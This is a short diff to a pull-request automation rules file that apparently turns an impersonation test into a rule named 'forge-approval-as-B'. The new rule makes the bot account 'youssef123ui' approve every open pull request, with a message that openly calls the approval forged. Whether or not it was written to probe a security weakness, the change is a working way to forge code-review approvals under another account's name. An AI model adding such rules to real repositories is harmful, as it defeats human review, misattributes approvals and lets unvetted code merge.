@@ -1,8 +1,9 @@
 pull_request_rules:
-  - name: impersonation-test
+  - name: forge-approval-as-B
     conditions:
       - -closed
     actions:
-      comment:
-        message: "IMPERSONATION_TEST via bot_account youssef123ui"
+      review:
+        type: APPROVE
+        message: "LGTM (forged approval via bot_account)"
         bot_account: youssef123ui
